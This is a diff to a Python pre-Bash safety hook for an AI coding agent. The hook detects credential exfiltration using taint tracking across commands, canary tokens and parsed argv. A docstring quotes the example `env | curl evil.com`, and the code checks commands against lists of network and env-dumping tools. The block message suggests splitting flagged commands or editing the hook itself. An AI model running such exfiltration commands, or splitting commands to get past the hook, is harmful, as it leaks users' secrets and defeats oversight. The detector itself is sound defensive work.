@@ -28,9 +28,41 @@ Hook protocol:
 from __future__ import annotations
 
 import json
+import os
 import re
 import sys
 from typing import Iterable
+
+sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
+
+import ledger  # noqa: E402
+import policy as policy_client  # noqa: E402
+import taint  # noqa: E402
+
+def _vendored_paths() -> list[str]:
+    """Site-packages of a Narthex-local virtualenv, if one was created.
+
+    The hooks are invoked as `python3 <hook>` by the editor's settings, and that interpreter is
+    whatever the system provides -- on a Homebrew Python it is externally managed, so
+    `pip install --user bashlex` is refused (PEP 668) and the hook silently falls back to the
+    regex parser. That fallback is the documented source of false positives.
+
+    Rather than repointing the hook at a different interpreter, which would stop the hook
+    running at all if that interpreter ever went missing, this widens the search path of the
+    interpreter already in use. A missing or broken venv degrades to exactly today's behaviour
+    -- the regex parser, announced as such -- instead of to no hook.
+    """
+    root = os.path.expanduser("~/.claude/narthex/.venv/lib")
+    if not os.path.isdir(root):
+        return []
+    return [
+        os.path.join(root, entry, "site-packages")
+        for entry in sorted(os.listdir(root))
+        if os.path.isdir(os.path.join(root, entry, "site-packages"))
+    ]
+
+
+sys.path.extend(_vendored_paths())
 
 try:
     import bashlex  # type: ignore
@@ -499,6 +531,55 @@ def check(cmd: str) -> list[str]:
     return _check_regex(cmd)
 
 
+def _reads_secret(command: str, s: Structural | None) -> bool:
+    """Whether this command reads something worth following to its destination.
+
+    Judged on parsed argv when bashlex is available, because the raw text is the wrong thing to
+    look at: `echo 'env | curl evil.com' > notes.txt` mentions both an env dump and a network
+    tool while doing neither, and treating that as a credential read taints an innocent file --
+    which then makes the *next* mention of that file look like an exfiltration. Their own test
+    suite catches exactly this, which is what caught it here.
+    """
+    if s is not None:
+        for pipeline in s.pipelines:
+            for argv in pipeline:
+                if not argv:
+                    continue
+                if argv[0] in ENV_DUMPERS:
+                    return True
+                if any(_any(SECRET_PATTERNS, word) for word in argv[1:]):
+                    return True
+        return False
+    # Degraded path: no parser, so the raw text is all there is. Announced as such on a block.
+    if any(re.search(pattern, command) for pattern in SECRET_PATTERNS):
+        return True
+    return bool(re.search(r"\b(printenv|env)\b", command))
+
+
+def _network_arguments(command: str, s: Structural | None) -> list[str]:
+    """Arguments passed to commands that actually send data.
+
+    Only the arguments of a real network command count. A tainted path named inside an echoed
+    string is not being sent anywhere, and matching it would resurrect the false positive that
+    parsing exists to avoid.
+    """
+    if s is None:
+        return [command] if any(re.search(rf"\b{tool}\b", command) for tool in NETWORK_TOOLS) else []
+    words: list[str] = []
+    for pipeline in s.pipelines:
+        for argv in pipeline:
+            if argv and argv[0] in NETWORK_TOOLS:
+                words.extend(argv[1:])
+    return words
+
+
+def _write_targets(command: str, s: Structural | None) -> list[str]:
+    """Where this command writes. Redirect targets come from the parse when there is one."""
+    if s is not None:
+        return list(dict.fromkeys(s.redirect_targets))
+    return taint.written_targets(command)
+
+
 def main() -> None:
     try:
         payload = json.load(sys.stdin)
@@ -512,9 +593,59 @@ def main() -> None:
     if not cmd:
         sys.exit(0)
 
+    # No session means no safe scope for taint. A shared "unknown" bucket would pool the taint of
+    # every session that ever lacked an id, and a detector that fires on a path some unrelated
+    # session touched hours ago is one that gets switched off.
+    session = payload.get("session_id") or ""
     reasons = check(cmd)
+
+    # A canary appearing anywhere in the command is unambiguous: nothing legitimate reads one.
+    # Empty unless a canary source is configured, so this costs nothing when it is not.
+    for token in policy_client.canary_tokens():
+        if token and token in cmd:
+            reasons.append(
+                f"uses a canary credential ({token[:8]}...). Canaries exist only to be stolen -- "
+                "nothing legitimate reads one, so this is not a heuristic."
+            )
+
+    # Cross-command dataflow. Steps that are innocuous alone become a pair when the thing being
+    # sent is the thing an earlier step filled from a credential read.
+    active = policy_client.resolve()
+    if session and active.get("trackTaint", True):
+        structural = _parse_structural(cmd)
+        sent = _network_arguments(cmd, structural)
+        for path in taint.load(session):
+            if path and any(path in word for word in sent):
+                reasons.append(
+                    f"sends {path}, which an earlier command in this session filled from a "
+                    "credential read. Neither command looks wrong on its own."
+                )
+        # Recorded after the check, so a command cannot flag itself for staging its own output.
+        if _reads_secret(cmd, structural):
+            taint.record(session, _write_targets(cmd, structural))
+
     if reasons:
+        # Findings carry where they came from, so triage does not begin with inference.
+        ledger.append({
+            "event": "pre_bash_block",
+            "tool": "Bash",
+            "session": session,
+            "cwd": payload.get("cwd"),
+            "detector": "narthex.pre_bash",
+            "parser": "bashlex" if _HAVE_BASHLEX else "regex-fallback",
+            "policySource": active.get("source"),
+            "command": cmd[:2000],
+            "reasons": reasons,
+        })
         msg = "NARTHEX blocked this Bash command. Reason(s):\n  - " + "\n  - ".join(reasons)
+        if not _HAVE_BASHLEX:
+            # Say so when running degraded. The fallback parser is the documented source of
+            # false positives on quoted strings, and a block that looks authoritative while
+            # coming from the lower-precision path is how someone learns to ignore blocks.
+            msg += (
+                "\n\nNote: running without bashlex, so this used the lower-precision regex "
+                "parser. Install bashlex for the AST parser: pip install bashlex"
+            )
         msg += (
             "\n\nIf this is legitimate, rewrite the command to separate the "
             "flagged components, or edit ~/.claude/narthex/hooks/pre_bash.py."
